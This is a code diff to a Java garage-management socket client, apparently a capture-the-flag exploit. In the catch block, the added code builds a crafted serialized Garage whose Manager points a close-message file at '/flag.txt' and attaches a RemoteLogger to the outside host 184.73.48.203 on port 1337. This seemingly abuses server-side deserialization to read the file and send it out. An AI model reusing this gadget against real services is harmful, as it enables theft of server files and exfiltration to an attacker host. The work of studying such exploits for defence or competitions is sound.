@@ -7,6 +7,8 @@ import java.io.*;
 import java.net.Socket;
 import java.net.UnknownHostException;
 import java.nio.file.Files;
+import java.lang.ProcessBuilder;
+
 
 public class GarageClient
 {
@@ -32,6 +34,7 @@ public class GarageClient
         String str = "";
         while(sessionActive) 
         {
+            System.out.println("wait response");
             str = Utils.readFromSocket(clientSocket);
             if(str.equals("[end]"))
             {
@@ -53,18 +56,36 @@ public class GarageClient
                     Utils.writeToSocket(clientSocket, sentence);
                     try
                     {
+                        System.out.println("sending");
                         FileInputStream fis = new FileInputStream("garage");
                         byte garageByteArray[] = Files.readAllBytes((new File("garage")).toPath());
                         Utils.sendGarage(clientSocket, garageByteArray);
                         clientState = 2;
+                        System.out.println("sent");
                     }
                     catch(FileNotFoundException e)
                     {
                         clientState = 1;
                         System.out.println("File not found.");
+                        Garage garage = new Garage();
+                        Manager employee = new Manager();
+                        garage.setManager(employee);
+                        for (int i = 0; i < 5; ++i)
+                            garage.addCar(new Car("123", "456", "678"));
+                        employee.setCloseMessageFile("/flag.txt");
+                        employee.setLogger(new RemoteLogger("184.73.48.203", 1337));
+                        FileOutputStream fos = new FileOutputStream("garage");
+                        fos.write(garage.toByteArray());
+                        fos.close();
+                        System.out.println("saved");
                         ObjectOutputStream oos = new ObjectOutputStream(clientSocket.getOutputStream());
-                        oos.writeObject(null);
+                        oos.writeObject(new Garage());
                         oos.flush();
+                        //ByteArrayOutputStream out = new ByteArrayOutputStream();
+                        //ObjectOutputStream os = new ObjectOutputStream(out);
+                        //os.writeObject(l);
+                        //Utils.sendGarage(clientSocket, out.toByteArray());
+                        //clientState = 2;
                     }
                 } else
                 if(sentence.equals("3"))
